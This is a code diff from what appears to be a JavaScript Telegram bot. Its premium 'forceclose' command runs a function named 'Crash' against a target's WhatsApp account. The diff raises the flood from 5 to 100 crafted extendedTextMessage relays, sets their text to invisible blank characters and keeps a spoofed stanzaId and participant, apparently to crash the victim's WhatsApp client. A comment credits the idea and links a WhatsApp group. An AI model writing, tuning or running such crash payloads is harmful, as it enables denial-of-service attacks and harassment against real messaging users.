@@ -1422,7 +1422,7 @@ bot.command("forceclose", checkWhatsAppConnection, checkPremium, async ctx => {
 
   await prosesrespone(target, ctx);
 
-  for (let i = 0; i < 5; i++) {
+  for (let i = 0; i < 1; i++) {
     await Crash(target);
     
 }
@@ -2008,10 +2008,10 @@ https://chat.whatsapp.com/I24OwNUuBzk6KRDeNDF62e
 THX TO OM TAMA, KARENA DIA SAYA MENDAPATKAN SEBUAH IDE TENTANG QUOTED INI
 */
 async function Crash(target) {
-    for (let i = 0; i < 5; i++) {
+    for (let i = 0; i < 100; i++) {
         await kipop.relayMessage(target, {
             "extendedTextMessage": {
-                "text": "Hai Sayang🦍",
+                "text": " ㅤㅤㅤ  ㅤㅤㅤ ㅤ",
                 "contextInfo": {
                     "stanzaId": "1234567890Konto𝐦𝐞𝐦𝐞𝐤n",
                     "participant": "5521992999999@s.whatsapp.net",
